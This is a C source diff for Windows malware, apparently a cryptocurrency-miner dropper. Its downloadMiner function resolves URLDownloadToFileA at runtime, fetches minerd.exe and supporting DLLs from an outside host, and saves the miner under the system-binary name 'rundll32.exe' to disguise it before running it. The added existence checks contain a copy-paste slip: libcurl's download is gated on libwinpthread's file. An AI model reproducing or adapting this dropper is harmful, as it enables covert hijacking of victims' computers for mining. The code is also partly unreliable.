@@ -19,6 +19,19 @@ void StartMiner()
     runFile(); 
 }
 
+int CheckFileExists(TCHAR * file)
+{
+    WIN32_FIND_DATA FindFileData;
+    HANDLE handle = FindFirstFile(file, &FindFileData);
+    int found = handle != INVALID_HANDLE_VALUE;
+    if (found)
+    {
+        FindClose(handle);
+    }
+    return found;
+}
+
+
 void runFile()
 {
     STARTUPINFO si = { 0 };
@@ -36,17 +49,20 @@ void runFile()
 
 void downloadMiner()
 {
-    //Probably isn't the best method at all, but it's what I got to work without trouble
     lpURLDownloadToFile URLDownloadToFile;
 
     HMODULE hUrlmon = LoadLibrary("URLMON.DLL");
 
     URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(hUrlmon, "URLDownloadToFileA");
 
-    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/minerd.exe", "rundll32.exe", 0, 0);
-    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/zlib1.dll", "zlib1.dll", 0, 0);
-    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libwinpthread-1.dll", "libwinpthread-1.dll", 0, 0);
-    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libcurl-4.dll", "libcurl-4.dll", 0, 0);
+    if (!CheckFileExists("rundll32.exe"))
+        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/minerd.exe", "rundll32.exe", 0, 0);
+    if (!CheckFileExists("zlib1.dll"))
+        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/zlib1.dll", "zlib1.dll", 0, 0);
+    if (!CheckFileExists("libwinpthread-1.dll"))
+        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libwinpthread-1.dll", "libwinpthread-1.dll", 0, 0);
+    if (!CheckFileExists("libwinpthread-1.dll"))
+        URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libcurl-4.dll", "libcurl-4.dll", 0, 0);
 
     return;
 }
